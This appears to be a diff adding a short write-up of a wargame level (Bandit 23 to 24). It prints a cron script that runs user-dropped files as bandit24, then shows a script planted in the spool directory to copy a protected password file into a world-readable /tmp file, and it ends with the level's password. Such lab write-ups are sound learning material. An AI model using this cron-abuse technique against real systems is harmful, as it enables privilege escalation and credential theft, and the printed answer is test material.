@@ -1,0 +1,54 @@
+In this challenge we need to invatigate the cron job and also write a script in order to get the passwd
+
+first we see the cron job which points to the script in /usr/bin/cronjob_bandit24
+
+this is written in the script
+
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+
+
+we can see that what this script to is execute all the script present in /var/spool/bandit24
+and delete them after 60 sec
+bandit24 directory has write permission for us
+
+so we create a directory in tmp directory where will will store our script
+
+by entering command "mkdir -p /tmp/ba" to create directory named ba in tmp
+
+now we create a script named script.sh in that ba directory
+
+what are script do is simply copy the password of bandit24 to a passwd file present in /tmp/ba directory
+
+#!/bin/bash
+
+cat /etc/bandit_pass/bandit24 > /tmp/ba/passwd
+
+give all permission to this script.sh file
+
+with the command "chmod 777 script.sh"
+
+and also create a file passwd and also give proper permission to this file
+with the command "chmod 666 passwd"
+
+now copy our script to /var/spool/bandit24 directory with cp command
+
+now just wait for a minute and we will get password for bandit24 in the passwd file
+
+the passwd for bandit24 is UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
